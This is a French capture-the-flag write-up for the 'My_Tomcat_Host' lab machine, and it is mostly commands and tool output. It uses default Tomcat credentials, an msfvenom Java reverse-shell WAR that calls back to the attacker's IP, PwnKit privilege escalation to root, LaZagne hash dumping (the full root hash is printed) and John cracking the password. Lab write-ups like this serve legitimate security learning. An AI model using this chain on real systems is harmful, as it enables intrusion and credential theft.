# My_Tomcat_Host

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.94
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.94...100%
[+] Scan Nmap 192.168.56.94...100%
 
[+] 22/tcp open
[+] 8080/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.94-tcp.html      |
==========================================================
```

&nbsp;

👽 Nikto

Recherche des identifiants `tomcat`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nikto -url http://192.168.56.94:8080 -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.94
+ Target Hostname:    192.168.56.94
+ Target Port:        8080
+ Start Time:         2025-02-15 14:29:05 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 Happiness Page identified which includes internal application details.
+ /manager/html: Default account found for 'Tomcat Manager Application' at (ID 'tomcat', PW 'tomcat'). Apache Tomcat. See: CWE-16
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected).
+ /axis2/services/Version/getVersion: Apache Axis2 version identified.
+ /axis2/services/listServices: Apache Axis2 WebServices identified.
+ /axis2/axis2-web/index.jsp: Apache Axis2 Web Application identified.
+ /host-manager/status: Default Tomcat Server Status interface found.
+ /manager/status: Tomcat Server Status interface found (pass protected).
+ 26764 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2025-02-15 14:29:56 (GMT1) (51 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

&nbsp;

**<span style="color: #dddddd;"><span style="color: #dddddd;">👻</span></span> MSFvenom**

Création d’un `reverse shell` en java

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f war > webshell.war
Payload size: 6214 bytes
Final size of war file: 6214 bytes
```

&nbsp;

**💥 Metasploit - meterpreter**

Ecoute du port `4444` pour obtenir le revershell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (58073 bytes) to 192.168.56.94
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.94:56984) at 2025-02-15 14:53:33 +0100

(Meterpreter 1)(/) > 
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Recherche de faille `root`

```
bash-4.2$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

<span style="color: #dddddd;">💀</span> **Exploit PwnKit**

Exploitation d’elevation de privilège

```
(Meterpreter 1)(/tmp) > upload /home/parrot/Desktop/exploit\ EP/PwnKit
[*] Uploading  : /home/parrot/Desktop/exploit EP/PwnKit -> PwnKit
[*] Uploaded -1.00 B of 17.62 KiB (-0.01%): /home/parrot/Desktop/exploit EP/PwnKit -> PwnKit
[*] Completed  : /home/parrot/Desktop/exploit EP/PwnKit -> PwnKit
```

&nbsp;

Application des droit d’exécution & exécution de l’exploit

```
bash-4.2$ chmod +x PwnKit
bash-4.2$ ./PwnKit
id
uid=0(root) gid=0(root) groups=0(root),997(tomcat)
bash -i
[root@my_tomcat tmp]# 
```

&nbsp;

<span style="color: #dddddd;">👾</span> **LaZagne**

Exécution

```
[root@my_tomcat Linux]# python laZagne.py all
python laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Grub passwords -----------------

[+] Hash found !!!
Login: root
Hash: ${GRUB2_PASSWORD}

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$lYoxb/H/0LQ5d50Q$mM2ej4Um6zmkg11uszJrBpZo/vI4TT6nEvQnlnI/GlB9otfNIyN9xXfATAxVAUzj4ojTE1pmFbY12NUzw2j/b0:18313:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.96255421638
```

&nbsp;

**🧨 JohnTheRipper**

Crack du mot de passe `root`

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john my_tomcat --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rootroot1        (root)     
1g 0:00:18:53 DONE (2025-02-15 17:45) 0.000882g/s 3681p/s 3681c/s 3681C/s ropeit4u..root33
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john my_tomcat --show
root:rootroot1:18313:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Identifiant trouver

| User | Password |
| --- | --- |
| root | rootroot1 |
